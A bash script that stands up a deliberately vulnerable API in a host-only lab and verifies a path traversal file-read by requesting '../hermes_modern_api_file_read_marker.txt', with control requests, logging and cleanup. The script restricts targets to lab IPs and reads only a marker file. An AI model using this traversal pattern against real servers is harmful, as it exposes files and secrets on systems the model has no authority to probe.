#!/usr/bin/env bash
# Modern API path traversal file-read safe-marker proof for authorized local lab only.
set -Eeuo pipefail

ATTACKER_IP="${ATTACKER_IP:-<lab-ip>}"
VICTIM_IP="${VICTIM_IP:-<lab-ip>}"
TARGET_PORT="${TARGET_PORT:-18083}"
RUN_ID="${RUN_ID:-modern_api_path_traversal_file_read_$(date -u +%Y%m%dT%H%M%SZ)}"
PROJECT_ROOT="${PROJECT_ROOT:-/mnt/hacking}"
VICTIM_SSH_USER="${VICTIM_SSH_USER:-kali}"
SSH_KEY="${SSH_KEY:-$PROJECT_ROOT/setting/local/ssh/kali_codex_ed25519}"
KNOWN_HOSTS="${KNOWN_HOSTS:-$PROJECT_ROOT/setting/local/ssh/known_hosts}"
SSH_CFG="${SSH_CFG:-$PROJECT_ROOT/setting/local/ssh/empty_ssh_config}"
OUT="$HOME/<artifact-output-dir>/$RUN_ID"
TARGET_URL="http://${VICTIM_IP}:${TARGET_PORT}"
CONTAINER="modern-api-pathread-${TARGET_PORT}"
MARKER="FILE_READ_SAFE_MARKER_HERMES_LOCAL_LAB"
PUBLIC_MARKER="PUBLIC_FILE_CONTROL_HERMES_LOCAL_LAB"

mkdir -p "$OUT/http" "$OUT/cleanup" "$OUT/diagnostics"
log(){ printf '[%s] %s\n' "$(date -u +%H:%M:%SZ)" "$*" | tee -a "$OUT/run.log"; }
fail(){ log "ERROR: $*"; collect_diagnostics || true; exit 1; }

require_local_lab_values(){
  [[ "$ATTACKER_IP" == 192.168.56.* ]] || fail "ATTACKER_IP must stay on host-only lab range <lab-ip>/24"
  [[ "$VICTIM_IP" == 192.168.56.* ]] || fail "VICTIM_IP must stay on host-only lab range <lab-ip>/24"
  [[ "$TARGET_URL" == http://192.168.56.* ]] || fail "TARGET_URL must target host-only local lab IP"
}

ssh_victim(){
  ssh -F "$SSH_CFG" -i "$SSH_KEY" -p 22 \
    -o UserKnownHostsFile="$KNOWN_HOSTS" \
    -o StrictHostKeyChecking=accept-new \
    "${VICTIM_SSH_USER}@${VICTIM_IP}" "$@"
}

scp_to_victim(){
  scp -F "$SSH_CFG" -i "$SSH_KEY" -P 22 \
    -o UserKnownHostsFile="$KNOWN_HOSTS" \
    -o StrictHostKeyChecking=accept-new "$@"
}

internet_state(){
  if timeout 3 bash -lc '</dev/tcp/1.1.1.1/80' 2>/dev/null; then echo internet_open; else echo internet_closed; fi
}

collect_diagnostics(){
  set +e
  ss -ltnp > "$OUT/diagnostics/attacker_ss_ltnp.txt" 2>&1
  ssh_victim "mkdir -p \$HOME/<artifact-output-dir>/$RUN_ID/diagnostics; docker ps -a > \$HOME/<artifact-output-dir>/$RUN_ID/diagnostics/victim_docker_ps_a.txt 2>&1; docker logs --tail 120 $CONTAINER > \$HOME/<artifact-output-dir>/$RUN_ID/diagnostics/victim_target_logs.txt 2>&1 || true; ss -ltnp > \$HOME/<artifact-output-dir>/$RUN_ID/diagnostics/victim_ss_ltnp.txt 2>&1" >/dev/null 2>&1 || true
}

cleanup(){
  set +e
  log "cleanup: removing victim target container $CONTAINER"
  ssh_victim "mkdir -p \$HOME/<artifact-output-dir>/$RUN_ID/cleanup; docker rm -f $CONTAINER > \$HOME/<artifact-output-dir>/$RUN_ID/cleanup/target_cleanup.txt 2>&1 || true; if timeout 3 bash -lc '</dev/tcp/1.1.1.1/80' 2>/dev/null; then echo internet_open > \$HOME/<artifact-output-dir>/$RUN_ID/cleanup/victim_internet.txt; else echo internet_closed > \$HOME/<artifact-output-dir>/$RUN_ID/cleanup/victim_internet.txt; fi" >/dev/null 2>&1 || true
  internet_state > "$OUT/cleanup/attacker_internet.txt"
  log "cleanup complete; attacker internet: $(cat "$OUT/cleanup/attacker_internet.txt" 2>/dev/null || echo unknown)"
}
trap cleanup EXIT

wait_for_attacker_health(){
  local i code
  for i in $(seq 1 25); do
    code=$(curl -sS -m 2 -o "$OUT/http/pre_health_attempt_${i}.json" -w '%{http_code}' "$TARGET_URL/health" 2>"$OUT/http/pre_health_attempt_${i}.err" || echo 000)
    printf '[%s] pre_health_attempt_%s=%s\n' "$(date -u +%H:%M:%SZ)" "$i" "$code" | tee -a "$OUT/run.log" >&2
    if [[ "$code" == "200" ]]; then cp "$OUT/http/pre_health_attempt_${i}.json" "$OUT/http/pre_health.json"; echo 200; return 0; fi
    sleep 1
  done
  echo 000
  return 1
}

urlencode(){ python3 - "$1" <<'PY'
from urllib.parse import quote
import sys
print(quote(sys.argv[1], safe=''))
PY
}

require_local_lab_values
log "RUN_ID=$RUN_ID"
log "OUT=$OUT"
log "ATTACKER_IP=$ATTACKER_IP VICTIM_IP=$VICTIM_IP TARGET_URL=$TARGET_URL"

[[ -d "$PROJECT_ROOT" ]] || fail "PROJECT_ROOT not found: $PROJECT_ROOT"
[[ -f "$PROJECT_ROOT/labs/modern_vuln_api/modern_vuln_api.py" ]] || fail "missing target source"
[[ -f "$SSH_KEY" ]] || fail "missing SSH key: $SSH_KEY"
command -v curl >/dev/null || fail "curl missing"
command -v python3 >/dev/null || fail "python3 missing"

log "checking attacker/victim Internet posture"
internet_state | tee "$OUT/attacker_internet_pre.txt"
ssh_victim "mkdir -p \$HOME/<artifact-output-dir>/$RUN_ID/http; if timeout 3 bash -lc '</dev/tcp/1.1.1.1/80' 2>/dev/null; then echo internet_open; else echo internet_closed; fi" | tee "$OUT/victim_internet_pre.txt"

log "copying and starting victim target"
ssh_victim "mkdir -p /home/kali/hermes-labs/modern_vuln_api \$HOME/<artifact-output-dir>/$RUN_ID/http \$HOME/<artifact-output-dir>/$RUN_ID/cleanup \$HOME/<artifact-output-dir>/$RUN_ID/diagnostics"
scp_to_victim "$PROJECT_ROOT/labs/modern_vuln_api/modern_vuln_api.py" "${VICTIM_SSH_USER}@${VICTIM_IP}:/home/kali/hermes-labs/modern_vuln_api/modern_vuln_api.py"
ssh_victim "docker rm -f $CONTAINER >/dev/null 2>&1 || true; docker run -d --name $CONTAINER -p 0.0.0.0:${TARGET_PORT}:${TARGET_PORT} -v /home/kali/hermes-labs/modern_vuln_api:/app:ro python:3-alpine python /app/modern_vuln_api.py --host 0.0.0.0 --port ${TARGET_PORT}; docker ps | grep $CONTAINER" | tee "$OUT/http/victim_target_start.txt"

log "waiting for attacker-to-victim pre-health"
PRE_CODE=$(wait_for_attacker_health || true)
log "pre_health=$PRE_CODE"
[[ "$PRE_CODE" == "200" ]] || fail "pre-health failed"

log "public-file control"
PUBLIC_CODE=$(curl -sS --max-time 8 -o "$OUT/http/public_control.json" -w '%{http_code}' "$TARGET_URL/file-read?name=public.txt" || echo 000)
log "public_control_status=$PUBLIC_CODE"

log "missing-file negative control"
MISS_CODE=$(curl -sS --max-time 8 -o "$OUT/http/missing_control.json" -w '%{http_code}' "$TARGET_URL/file-read?name=missing-${RUN_ID}.txt" || echo 000)
log "missing_control_status=$MISS_CODE"

TRAVERSAL_NAME="../hermes_modern_api_file_read_marker.txt"
TRAVERSAL_ENC=$(urlencode "$TRAVERSAL_NAME")
log "positive traversal safe-marker read"
POS_CODE=$(curl -sS --max-time 8 -o "$OUT/http/traversal_positive.json" -w '%{http_code}' "$TARGET_URL/file-read?name=$TRAVERSAL_ENC" || echo 000)
log "traversal_positive_status=$POS_CODE"

POST_CODE=$(curl -sS -m 5 -o "$OUT/http/post_health.json" -w '%{http_code}' "$TARGET_URL/health" || echo 000)
log "post_health=$POST_CODE"

PUBLIC_OK=no
MISSING_OK=no
MARKER_OK=no
if grep -q "$PUBLIC_MARKER" "$OUT/http/public_control.json" 2>/dev/null; then PUBLIC_OK=yes; fi
if [[ "$MISS_CODE" == "404" ]]; then MISSING_OK=yes; fi
if grep -q "$MARKER" "$OUT/http/traversal_positive.json" 2>/dev/null; then MARKER_OK=yes; fi

cat > "$OUT/summary.md" <<EOF
# Modern API path traversal file-read safe-marker wave 1

run_id: $RUN_ID
target: $TARGET_URL
pre_health: $PRE_CODE
public_control_status: $PUBLIC_CODE
public_control_marker_found: $PUBLIC_OK
missing_control_status: $MISS_CODE
missing_control_ok: $MISSING_OK
traversal_positive_status: $POS_CODE
traversal_marker_found: $MARKER_OK
post_health: $POST_CODE

## Boundary

Local authorized lab only. Lab-owned marker files only. No sensitive system files, secrets, credentials, public target, shell, persistence, or exfiltration.

## Key artifacts

- http/pre_health.json
- http/public_control.json
- http/missing_control.json
- http/traversal_positive.json
- http/post_health.json
- cleanup/
EOF

log "public_marker_found=$PUBLIC_OK missing_control_ok=$MISSING_OK traversal_marker_found=$MARKER_OK"
log "summary=$OUT/summary.md"
if [[ "$PRE_CODE" == "200" && "$PUBLIC_CODE" == "200" && "$PUBLIC_OK" == "yes" && "$MISSING_OK" == "yes" && "$POS_CODE" == "200" && "$MARKER_OK" == "yes" && "$POST_CODE" == "200" ]]; then
  log "VERDICT=verified_file_read_safe_marker_lab_only"
else
  log "VERDICT=attempted_not_verified"
fi
